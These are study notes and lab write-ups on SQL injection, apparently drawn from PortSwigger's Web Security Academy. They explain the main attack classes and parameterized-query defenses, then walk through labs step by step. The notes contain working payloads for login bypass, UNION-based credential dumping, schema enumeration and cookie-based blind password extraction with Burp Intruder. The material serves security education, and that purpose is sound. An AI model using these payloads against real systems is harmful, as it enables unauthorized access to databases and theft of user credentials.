# SQLi (SQL Injection)

## PortSwigger Notes

### What is SQL injection (SQLi)?

SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users, or any other data that the application itself is able to access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.

In some situations, an attacker can escalate an SQL injection attack to compromise the underlying server or other back-end infrastructure, or perform a denial-of-service attack.

### SQL injection examples

There are a wide variety of SQL injection vulnerabilities, attacks, and techniques, which arise in different situations. Some common SQL injection examples include:

* Retrieving hidden data, where you can modify an SQL query to return additional results.
* Subverting application logic, where you can change a query to interfere with the application's logic.
* UNION attacks, where you can retrieve data from different database tables.
* Examining the database, where you can extract information about the version and structure of the database.
* Blind SQL injection, where the results of a query you control are not returned in the application's responses.

### Retrieving hidden data

Consider a shopping application that displays products in different categories. When the user clicks on the Gifts category, their browser requests the URL:

`https://insecure-website.com/products?category=Gifts`

This causes the application to make an SQL query to retrieve details of the relevant products from the database:

`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

The application doesn't implement any defenses against SQL injection attacks, so an attacker can construct an attack like:

`https://insecure-website.com/products?category=Gifts'--`

This results in the SQL query:

`SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1`

The key thing here is that the double-dash sequence -- is a comment indicator in SQL, and means that the rest of the query is interpreted as a comment. This effectively removes the remainder of the query, so it no longer includes AND released = 1. This means that all products are displayed, including unreleased products.

Going further, an attacker can cause the application to display all the products in any category, including categories that they don't know about:

`https://insecure-website.com/products?category=Gifts'+OR+1=1--`

This results in the SQL query:

`SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1`

The modified query will return all items where either the category is Gifts, or 1 is equal to 1. Since 1=1 is always true, the query will return all items.

### Subverting application logic

Consider an application that lets users log in with a username and password. If a user submits the username wiener and the password bluecheese, the application checks the credentials by performing the following SQL query:

`SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'`

If the query returns the details of a user, then the login is successful. Otherwise, it is rejected.

Here, an attacker can log in as any user without a password simply by using the SQL comment sequence -- to remove the password check from the WHERE clause of the query. For example, submitting the username administrator'-- and a blank password results in the following query:

`SELECT * FROM users WHERE username = 'administrator'--' AND password = ''`

This query returns the user whose username is administrator and successfully logs the attacker in as that user.

### Retrieving data from other database tables

In cases where the results of an SQL query are returned within the application's responses, an attacker can leverage an SQL injection vulnerability to retrieve data from other tables within the database. This is done using the `UNION` keyword, which lets you execute an additional `SELECT` query and append the results to the original query.

For example, if an application executes the following query containing the user input "Gifts":

`SELECT name, description FROM products WHERE category = 'Gifts'`

then an attacker can submit the input:

`' UNION SELECT username, password FROM users--`

This will cause the application to return all usernames and passwords along with the names and descriptions of products.

### Examining the database

Following initial identification of an SQL injection vulnerability, it is generally useful to obtain some information about the database itself. This information can often pave the way for further exploitation.

You can query the version details for the database. The way that this is done depends on the database type, so you can infer the database type from whichever technique works. For example, on Oracle you can execute:

`SELECT * FROM v$version`

You can also determine what database tables exist, and which columns they contain. For example, on most databases you can execute the following query to list the tables:

`SELECT * FROM information_schema.tables`

### Blind SQL injection Vulnerabilities

Many instances of SQL injection are blind vulnerabilities. This means that the application does not return the results of the SQL query or the details of any database errors within its responses. Blind vulnerabilities can still be exploited to access unauthorized data, but the techniques involved are generally more complicated and difficult to perform.

Depending on the nature of the vulnerability and the database involved, the following techniques can be used to exploit blind SQL injection vulnerabilities:

* You can change the logic of the query to trigger a detectable difference in the application's response depending on the truth of a single condition. This might involve injecting a new condition into some Boolean logic, or conditionally triggering an error such as a divide-by-zero.
* You can conditionally trigger a time delay in the processing of the query, allowing you to infer the truth of the condition based on the time that the application takes to respond.
* You can trigger an out-of-band network interaction, using [OAST](https://portswigger.net/burp/application-security-testing/oast) techniques. This technique is extremely powerful and works in situations where the other techniques do not. Often, you can directly exfiltrate data via the out-of-band channel, for example by placing the data into a DNS lookup for a domain that you control.

### How to detect SQL injection vulnerabilities

The majority of SQL injection vulnerabilities can be found quickly and reliably using Burp Suite's [web vulnerability scanner](https://portswigger.net/burp/vulnerability-scanner).

SQL injection can be detected manually by using a systematic set of tests against every entry point in the application. This typically involves:

* Submitting the single quote character `'` and looking for errors or other anomalies.
* Submitting some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and looking for systematic differences in the resulting application responses.
* Submitting Boolean conditions such as `OR 1=1` and `OR 1=2, and` looking for differences in the application's responses.
* Submitting payloads designed to trigger time delays when executed within an SQL query, and looking for differences in the time taken to respond.
* Submitting OAST payloads designed to trigger an out-of-band network interaction when executed within an SQL query, and monitoring for any resulting interactions.

### SQL injection in different parts of the query

Most SQL injection vulnerabilities arise within the `WHERE` clause of a `SELECT` query. This type of SQL injection is generally well-understood by experienced testers.

But SQL injection vulnerabilities can in principle occur at any location within the query, and within different query types. The most common other locations where SQL injection arises are:

* In `UPDATE` statements, within the updated values or the `WHERE` clause.
* In `INSERT` statements, within the inserted values.
* In `SELECT` statements, within the table or column name.
* In `SELECT` statements, within the `ORDER BY` clause.

### Second-order SQL injection

First-order SQL injection arises where the application takes user input from an HTTP request and, in the course of processing that request, incorporates the input into an SQL query in an unsafe way.

In second-order SQL injection (also known as stored SQL injection), the application takes user input from an HTTP request and stores it for future use. This is usually done by placing the input into a database, but no vulnerability arises at the point where the data is stored. Later, when handling a different HTTP request, the application retrieves the stored data and incorporates it into an SQL query in an unsafe way.

Second-order SQL injection often arises in situations where developers are aware of SQL injection vulnerabilities, and so safely handle the initial placement of the input into the database. When the data is later processed, it is deemed to be safe, since it was previously placed into the database safely. At this point, the data is handled in an unsafe way, because the developer wrongly deems it to be trusted.

### Database-specific factors

Some core features of the SQL language are implemented in the same way across popular database platforms, and so many ways of detecting and exploiting SQL injection vulnerabilities work identically on different types of database.

However, there are also many differences between common databases. These mean that some techniques for detecting and exploiting SQL injection work differently on different platforms. For example:

* Syntax for string concatenation.
* Comments.
* Batched (or stacked) queries.
* Platform-specific APIs.
* Error messages.

### How to prevent SQL injection

Most instances of SQL injection can be prevented by using parameterized queries (also known as prepared statements) instead of string concatenation within the query.

The following code is vulnerable to SQL injection because the user input is concatenated directly into the query:

`String query = "SELECT * FROM products WHERE category = '"+ input + "'";`

`Statement statement = connection.createStatement();`

`ResultSet resultSet = statement.executeQuery(query);`

This code can be easily rewritten in a way that prevents the user input from interfering with the query structure:

`PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");`

`statement.setString(1, input);`

`ResultSet resultSet = statement.executeQuery();`

Parameterized queries can be used for any situation where untrusted input appears as data within the query, including the `WHERE` clause and values in an `INSERT` or `UPDATE` statement. They can't be used to handle untrusted input in other parts of the query, such as table or column names, or the `ORDER BY` clause. Application functionality that places untrusted data into those parts of the query will need to take a different approach, such as white-listing permitted input values, or using different logic to deliver the required behavior.

For a parameterized query to be effective in preventing SQL injection, the string that is used in the query must always be a hard-coded constant, and must never contain any variable data from any origin. Do not be tempted to decide case-by-case whether an item of data is trusted, and continue using string concatenation within the query for cases that are considered safe. It is all too easy to make mistakes about the possible origin of data, or for changes in other code to violate assumptions about what data is tainted.

## SQL injection UNION attacks

When an application is vulnerable to SQL injection and the results of the query are returned within the application's responses, the `UNION` keyword can be used to retrieve data from other tables within the database. This results in an SQL injection UNION attack.

The `UNION` keyword lets you execute one or more additional `SELECT` queries and append the results to the original query. For example:

`SELECT a, b FROM table1 UNION SELECT c, d FROM table2`

This SQL query will return a single result set with two columns, containing values from columns `a` and `b` in `table1` and columns `c` and `d` in `table2`.

For a `UNION` query to work, two key requirements must be met:

* The individual queries must return the same number of columns.
* The data types in each column must be compatible between the individual queries.

To carry out an SQL injection UNION attack, you need to ensure that your attack meets these two requirements. This generally involves figuring out:

* How many columns are being returned from the original query?
* Which columns returned from the original query are of a suitable data type to hold the results from the injected query?

### Determining the number of columns required in an SQL injection UNION attack

When performing an SQL injection UNION attack, there are two effective methods to determine how many columns are being returned from the original query.

The first method involves injecting a series of `ORDER BY` clauses and incrementing the specified column index until an error occurs. For example, assuming the injection point is a quoted string within the `WHERE` clause of the original query, you would submit:

`' ORDER BY 1--`\
`' ORDER BY 2--`\
`' ORDER BY 3--`\
`etc.`

This series of payloads modifies the original query to order the results by different columns in the result set. The column in an `ORDER BY` clause can be specified by its index, so you don't need to know the names of any columns. When the specified column index exceeds the number of actual columns in the result set, the database returns an error, such as:

`The ORDER BY position number 3 is out of range of the number of items in the select list.`

The application might actually return the database error in its HTTP response, or it might return a generic error, or simply return no results. Provided you can detect some difference in the application's response, you can infer how many columns are being returned from the query.

The second method involves submitting a series of `UNION SELECT` payloads specifying a different number of null values:

`' UNION SELECT NULL--`\
`' UNION SELECT NULL,NULL--`\
`' UNION SELECT NULL,NULL,NULL--`\
`etc.`

If the number of nulls does not match the number of columns, the database returns an error, such as:

`All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.`

Again, the application might actually return this error message, or might just return a generic error or no results. When the number of nulls matches the number of columns, the database returns an additional row in the result set, containing null values in each column. The effect on the resulting HTTP response depends on the application's code. If you are lucky, you will see some additional content within the response, such as an extra row on an HTML table. Otherwise, the null values might trigger a different error, such as a `NullPointerException`. Worst case, the response might be indistinguishable from that which is caused by an incorrect number of nulls, making this method of determining the column count ineffective.

### Finding columns with a useful data type in an SQL injection UNION attack

The reason for performing an SQL injection UNION attack is to be able to retrieve the results from an injected query. Generally, the interesting data that you want to retrieve will be in string form, so you need to find one or more columns in the original query results whose data type is, or is compatible with, string data.

Having already determined the number of required columns, you can probe each column to test whether it can hold string data by submitting a series of `UNION SELECT` payloads that place a string value into each column in turn. For example, if the query returns four columns, you would submit:

`' UNION SELECT 'a',NULL,NULL,NULL--`\
`' UNION SELECT NULL,'a',NULL,NULL--`\
`' UNION SELECT NULL,NULL,'a',NULL--`\
`' UNION SELECT NULL,NULL,NULL,'a'--`

If the data type of a column is not compatible with string data, the injected query will cause a database error, such as:

`Conversion failed when converting the varchar value 'a' to data type int.`

If an error does not occur, and the application's response contains some additional content including the injected string value, then the relevant column is suitable for retrieving string data.

### Using an SQL injection UNION attack to retrieve interesting data

When you have determined the number of columns returned by the original query and found which columns can hold string data, you are in a position to retrieve interesting data.

Suppose that:

* The original query returns two columns, both of which can hold string data.
* The injection point is a quoted string within the `WHERE` clause.
* The database contains a table called `users` with the columns `username` and `password`.

In this situation, you can retrieve the contents of the `users` table by submitting the input:

`' UNION SELECT username, password FROM users--`

Of course, the crucial information needed to perform this attack is that there is a table called `users` with two columns called `username` and `password`. Without this information, you would be left trying to guess the names of tables and columns. In fact, all modern databases provide ways of examining the database structure, to determine what tables and columns it contains.

### Retrieving multiple values within a single column <a href="#retrieving-multiple-values-within-a-single-column" id="retrieving-multiple-values-within-a-single-column"></a>

In the preceding example, suppose instead that the query only returns a single column.

You can easily retrieve multiple values together within this single column by concatenating the values together, ideally including a suitable separator to let you distinguish the combined values. For example, on Oracle you could submit the input:

`' UNION SELECT username || '~' || password FROM users--`

This uses the double-pipe sequence `||` which is a string concatenation operator on Oracle. The injected query concatenates together the values of the `username` and `password` fields, separated by the `~` character.

The results from the query will let you read all of the usernames and passwords, for example:

`...`\
`administrator~s3cure`\
`wiener~peter`\
`carlos~montoya`\
`...`

## Examining the database in SQL injection attacks

When exploiting [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerabilities, it is often necessary to gather some information about the database itself. This includes the type and version of the database software, and the contents of the database in terms of which tables and columns it contains.

### Querying the database type and version

Different databases provide different ways of querying their version. You often need to try out different queries to find one that works, allowing you to determine both the type and version of the database software.

The queries to determine the database version for some popular database types are as follows:

| Database type    | Query                     |
| ---------------- | ------------------------- |
| Microsoft, MySQL | `SELECT @@version`        |
| Oracle           | `SELECT * FROM v$version` |
| PostgreSQL       | `SELECT version()`        |

For example, you could use a `UNION` attack with the following input:

`' UNION SELECT @@version--`

This might return output like the following, confirming that the database is Microsoft SQL Server, and the version that is being used:

`Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)`\
`Mar 18 2018 09:11:49`\
`Copyright (c) Microsoft Corporation`\
`Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)`

### Listing the contents of the database

Most database types (with the notable exception of Oracle) have a set of views called the information schema which provide information about the database.

You can query `information_schema.tables` to list the tables in the database:

`SELECT * FROM information_schema.tables`

This returns output like the following:

`TABLE_CATALOG TABLE_SCHEMA TABLE_NAME TABLE_TYPE`\
`=====================================================`\
`MyDatabase dbo Products BASE TABLE`\
`MyDatabase dbo Users BASE TABLE`\
`MyDatabase dbo Feedback BASE TABLE`

This output indicates that there are three tables, called `Products`, `Users`, and `Feedback`.

You can then query `information_schema.columns` to list the columns in individual tables:

`SELECT * FROM information_schema.columns WHERE table_name = 'Users'`

This returns output like the following:

`TABLE_CATALOG TABLE_SCHEMA TABLE_NAME COLUMN_NAME DATA_TYPE`\
`=================================================================`\
`MyDatabase dbo Users UserId int`\
`MyDatabase dbo Users Username varchar`\
`MyDatabase dbo Users Password varchar`

This output shows the columns in the specified table and the data type of each column.

### Equivalent to information schema on Oracle

On Oracle, you can obtain the same information with slightly different queries.

You can list tables by querying `all_tables`:

`SELECT * FROM all_tables`

And you can list columns by querying `all_tab_columns`:

`SELECT * FROM all_tab_columns WHERE table_name = 'USERS'`

## Blind SQL injection

### What is blind SQL injection?

Blind SQL injection arises when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.

With blind SQL injection vulnerabilities, many techniques such as [`UNION` attacks](https://portswigger.net/web-security/sql-injection/union-attacks), are not effective because they rely on being able to see the results of the injected query within the application's responses. It is still possible to exploit blind SQL injection to access unauthorized data, but different techniques must be used.

### Exploiting blind SQL injection by triggering conditional responses

Consider an application that uses tracking cookies to gather analytics about usage. Requests to the application include a cookie header like this:

`Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4`

When a request containing a `TrackingId` cookie is processed, the application determines whether this is a known user using an SQL query like this:

`SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'`

This query is vulnerable to SQL injection, but the results from the query are not returned to the user. However, the application does behave differently depending on whether the query returns any data. If it returns data (because a recognized `TrackingId` was submitted), then a "Welcome back" message is displayed within the page.

This behavior is enough to be able to exploit the blind SQL injection vulnerability and retrieve information by triggering different responses conditionally, depending on an injected condition. To see how this works, suppose that two requests are sent containing the following `TrackingId` cookie values in turn:

`…xyz' AND '1'='1`\
`…xyz' AND '1'='2`

The first of these values will cause the query to return results, because the injected `AND '1'='1` condition is true, and so the "Welcome back" message will be displayed. Whereas the second value will cause the query to not return any results, because the injected condition is false, and so the "Welcome back" message will not be displayed. This allows us to determine the answer to any single injected condition, and so extract data one bit at a time.

For example, suppose there is a table called `Users` with the columns `Username` and `Password`, and a user called `Administrator`. We can systematically determine the password for this user by sending a series of inputs to test the password one character at a time.

To do this, we start with the following input:

`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`

This returns the "Welcome back" message, indicating that the injected condition is true, and so the first character of the password is greater than `m`.

Next, we send the following input:

`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't`

This does not return the "Welcome back" message, indicating that the injected condition is false, and so the first character of the password is not greater than `t`.

Eventually, we send the following input, which returns the "Welcome back" message, thereby confirming that the first character of the password is `s`:

`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's`

We can continue this process to systematically determine the full password for the `Administrator` user.

### Inducing conditional responses by triggering SQL errors <a href="#inducing-conditional-responses-by-triggering-sql-errors" id="inducing-conditional-responses-by-triggering-sql-errors"></a>

In the preceding example, suppose instead that the application carries out the same SQL query, but does not behave any differently depending on whether the query returns any data. The preceding technique will not work, because injecting different Boolean conditions makes no difference to the application's responses.

In this situation, it is often possible to induce the application to return conditional responses by triggering SQL errors conditionally, depending on an injected condition. This involves modifying the query so that it will cause a database error if the condition is true, but not if the condition is false. Very often, an unhandled error thrown by the database will cause some difference in the application's response (such as an error message), allowing us to infer the truth of the injected condition.

To see how this works, suppose that two requests are sent containing the following `TrackingId` cookie values in turn:

`xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a`\
`xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a`

These inputs use the `CASE` keyword to test a condition and return a different expression depending on whether the expression is true. With the first input, the `CASE` expression evaluates to `'a'`, which does not cause any error. With the second input, it evaluates to `1/0`, which causes a divide-by-zero error. Assuming the error causes some difference in the application's HTTP response, we can use this difference to infer whether the injected condition is true.

Using this technique, we can retrieve data in the way already described, by systematically testing one character at a time:

`xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`

### Exploiting blind SQL injection by triggering time delays

### Exploiting blind SQL injection using out-of-band (OAST) techniques

### How to prevent blind SQL injection attacks?

## PortSwigger Labs

#### SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

> This lab contains an SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out an SQL query like the following:
>
> `SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
>
> To solve the lab, perform an SQL injection attack that causes the application to display details of all products in any category, both released and unreleased.

* When navigating to the webpage and selecting a category we get the below URL
* `https://acbe1f741ffa1ec1c0ad7146005d0034.web-security-academy.net/filter?category=Pets`
* We can add a little SQL to get the additional data

* When navigating to the webpage and selecting My Account we get as simple login form
* In the Username field we can place in `administrator'--` and in the Password field we can put junk text and we successfully log in as the administrator user.

### UNION Attack

#### SQL injection UNION attack, determining the number of columns returned by the query

> This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query.

* On the `category=` parameter I added an apostrophe to check for SQLi and got an Internal Server Error which told me it was probably vulnerable. I then attempted to check to see if I can determine how many columns there were by appending `'UNION SELECT NULL,NULL,NULL--` to the parameter.&#x20;

#### SQL injection UNION attack, finding a column containing text

> The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform an SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.

* Knowing from the previous lab that there are 3 columns I passed in a string to each value and saw that in the second column it was successful: `' UNION SELECT NULL,'a',NULL--`

#### SQL injection UNION attack, retrieving data from other tables

> The database contains a different table called users, with columns called username and password.
>
> To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.

* Using the following payload I was able to extract the users and their passwords
* `' UNION SELECT username, password FROM users--`

#### SQL injection UNION attack, retrieving multiple values in a single column

> The database contains a different table called users, with columns called username and password.
>
> To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.

* This table was found to have only two columns: `'+UNION+SELECT+NULL,'a'--`
* We can replace the string portion with our user account query: `'+UNION+SELECT+NULL,username || '~' || password FROM users--`

### Querying the Database

#### SQL injection attack, querying the database type and version on Oracle

> This lab contains an SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
>
> To solve the lab, display the database version string.

* Identifying the `category=` parameter is vulnerable to SQLi I was unable to use UNION to determine the number of columns so I used ORDER BY: `' ORDER BY 2--`
* Also check for columns the Oracle has by using `' UNION SELECT NULL,NULL FROM DUAL--`
* Lastly, we can get the DB version using: `' UNION SELECT BANNER, NULL FROM v$version--`

#### SQL injection attack, querying the database type and version on MySQL and Microsoft

> This lab contains an SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
>
> To solve the lab, display the database version string.

* Identified 2 columns using the following query, also updating the comment character: `' UNION SELECT NULL,NULL-- -` Also determined they are both string column using: `' UNION SELECT 'a','a'-- -` In either case, we can get the version of the DB using: `' UNION SELECT NULL,@@version-- -`

#### SQL injection attack, listing the database contents on non-Oracle databases

> The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

* Determined the amount of columns: `' UNION SELECT NULL,NULL-- -`
* Determined the list of table names: `' UNION SELECT table_name ,NULL FROM information_schema.tables-- -`
* Retrieved the columns of the table: `' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name = 'users_qhgmcj'-- -`
* Retrieved the usernames and passwords from the columns: `' UNION SELECT username_oidvtd,password_twatyj FROM users_qhgmcj-- -`

#### SQL injection attack, listing the database contents on Oracle

> The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

* Determined the amount of columns: `' UNION SELECT NULL,NULL FROM DUAL--`
* Determined the list of table names: `' UNION SELECT table_name,NULL FROM all_tables--`
* Retrieved the columns of the table: `' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name = 'USERS_ETKVLE'--`
* Retrieved the usernames and passwords from the columns: `'UNION SELECT USERNAME_OSCRET,PASSWORD_DIWNVQ FROM USERS_ETKVLE--`

### Blind SQL Injection

#### Blind SQL injection with conditional responses

> This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.
>
> The results of the SQL query are not returned, and no error messages are displayed. But the application includes a "Welcome back" message in the page if the query returns any rows.
>
> The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

* Intercepted the request to the homepage and found the `TackingId` cookie.
* Modified the `TrackingId` cookie, changing it to: `TrackingId=xyz' AND '1'='1`. Verify that the "Welcome back" message appears in the response.
* Now change it to: `TrackingId=xyz' AND '1'='2`. Verify that the "Welcome back" message does not appear in the response. This demonstrates how you can test a single boolean condition and infer the result.
* Now change it to: `TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a`. Verify that the condition is true, confirming that there is a table called `users`.Now change it to: `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a`. Verify that the condition is true, confirming that there is a user called `administrator`.
* The next step is to determine how many characters are in the password of the `administrator` user. To do this, change the value to: `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a`. This condition should be true, confirming that the password is greater than 1 character in length.
* Send a series of follow-up values to test different password lengths. Send: `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a`. Then send: `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a`. And so on. You can do this manually using [Burp Repeater](https://portswigger.net/burp/documentation/desktop/tools/repeater), since the length is likely to be short. When the condition stops being true (i.e. when the "Welcome back" message disappears), you have determined the length of the password, which is in fact 20 characters long.
* After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use [Burp Intruder](https://portswigger.net/burp/documentation/desktop/tools/intruder). Send the request you are working on to Burp Intruder, using the context menu.
* In the Positions tab of Burp Intruder, clear the default payload positions by clicking the "Clear §" button.
* In the Positions tab, change the value of the cookie to: `TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a`. This uses the `SUBSTRING()` function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.
* Place payload position markers around the final `a` character in the cookie value. To do this, select just the `a`, and click the "Add §" button. You should then see the following as the cookie value (note the payload position markers): `TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§`
* To test the character at each position, you'll need to send suitable payloads in the payload position that you've defined. You can assume that the password contains only lowercase alphanumeric characters. Go to the Payloads tab, check that "Simple list" is selected, and under "Payload Options" add the payloads in the range a - z and 0 - 9. You can select these easily using the "Add from list" drop-down.
* To be able to tell when the correct character was submitted, you'll need to grep each response for the expression "Welcome back". To do this, go to the Options tab, and the "Grep - Match" section. Clear any existing entries in the list, and then add the value "Welcome back".
* Launch the attack by clicking the "Start attack" button or selecting "Start attack" from the Intruder menu.
* Review the attack results to find the value of the character at the first position. You should see a column in the results called "Welcome back". One of the rows should have a tick in this column. The payload showing for that row is the value of the character at the first position.
* Now, you simply need to re-run the attack for each of the other character positions in the password, to determine their value. To do this, go back to the main Burp window, and the Positions tab of Burp Intruder, and change the specified offset from 1 to 2. You should then see the following as the cookie value: `TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a`
* Launch the modified attack, review the results, and note the character at the second offset.
* Continue this process testing offset 3, 4, and so on, until you have the whole password.
* In your browser, click "My account" to open the login page. Use the password to log in as the `administrator` user.
